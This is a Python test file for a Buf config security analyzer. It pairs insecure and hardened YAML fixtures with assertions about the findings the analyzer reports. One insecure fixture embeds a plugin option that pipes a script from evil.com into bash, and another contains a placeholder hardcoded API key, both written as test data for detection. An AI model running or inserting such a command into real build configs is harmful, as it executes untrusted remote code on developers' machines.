"""Tests for BufAnalyzer."""

from pathlib import Path

from devai.buf_analyzer import BufAnalyzer


INSECURE_BUF = """\
version: v2
modules:
  - path: proto
breaking:
  use: NONE
lint:
  use: NONE
# API_KEY = "hardcoded-secret-token-12345"
"""

INSECURE_GEN = """\
version: v2
plugins:
  - remote: buf.build/community/pseudomuto-protoc-gen-doc
    out: docs
  - plugin: ../tools/protoc-gen-custom
    out: gen
  - plugin: protoc-gen-go
    out: gen
    opt:
      - run=curl http://evil.com/install.sh | bash
"""

HARDENED_BUF = """\
version: v2
modules:
  - path: proto
breaking:
  use:
    - FILE
lint:
  use:
    - DEFAULT
"""

HARDENED_GEN = """\
version: v2
plugins:
  - remote: buf.build/protocolbuffers/go:v1.34.2
    out: gen/go
    opt: paths=source_relative
"""


class TestBufAnalyzer:
    def test_detects_insecure_module_config(self, tmp_path: Path):
        (tmp_path / "buf.yaml").write_text(INSECURE_BUF, encoding="utf-8")
        analyzer = BufAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "breaking_disabled" in kinds
        assert "lint_disabled" in kinds
        assert analyzer.health_score() < 100.0

    def test_detects_insecure_gen_config(self, tmp_path: Path):
        (tmp_path / "buf.gen.yaml").write_text(INSECURE_GEN, encoding="utf-8")
        analyzer = BufAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "local_plugin_path" in kinds
        assert "curl_pipe_shell" in kinds
        assert "unpinned_remote_plugin" in kinds

    def test_hardened_configs_clean(self, tmp_path: Path):
        (tmp_path / "buf.yaml").write_text(HARDENED_BUF, encoding="utf-8")
        (tmp_path / "buf.gen.yaml").write_text(HARDENED_GEN, encoding="utf-8")
        analyzer = BufAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []
        assert analyzer.health_score() == 100.0
        assert len(analyzer.infos) == 2

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = BufAnalyzer(str(tmp_path))
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_to_context_includes_metadata(self, tmp_path: Path):
        (tmp_path / "buf.yaml").write_text(HARDENED_BUF, encoding="utf-8")
        analyzer = BufAnalyzer(str(tmp_path))
        ctx = analyzer.to_context()
        assert "Buf analysis" in ctx
        assert "DEFAULT" in ctx or "module" in ctx

    def test_generate_hardened_config(self):
        snippet = BufAnalyzer(".").generate_hardened_config()
        assert "DEFAULT" in snippet
        assert "FILE" in snippet
